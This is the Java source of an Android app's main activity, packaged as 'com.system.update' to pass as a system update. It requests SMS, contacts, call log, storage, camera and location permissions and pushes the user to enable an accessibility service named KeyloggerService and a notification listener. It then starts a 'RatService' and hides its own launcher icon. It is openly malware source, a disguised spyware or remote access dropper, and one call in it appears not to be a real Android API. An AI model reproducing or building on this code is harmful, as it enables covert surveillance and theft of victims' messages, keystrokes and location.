package com.system.update;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import androidx.core.app.ActivityCompat;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        String[] perms = {
            android.Manifest.permission.READ_SMS, android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.SEND_SMS, android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_CALL_LOG, android.Manifest.permission.READ_EXTERNAL_STORAGE,
            android.Manifest.permission.CAMERA, android.Manifest.permission.ACCESS_FINE_LOCATION
        };
        ActivityCompat.requestPermissions(this, perms, 1);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.isAccessibilityServiceEnabled(this, KeyloggerService.class)) {
                startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS));
            }
            String enabledListeners = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
            if (enabledListeners == null || !enabledListeners.contains(getPackageName())) {
                startActivity(new Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS));
            }
        }

        Intent serviceIntent = new Intent(this, RatService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }

        PackageManager p = getPackageManager();
        ComponentName componentName = new ComponentName(this, MainActivity.class);
        p.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        finish();
    }
}
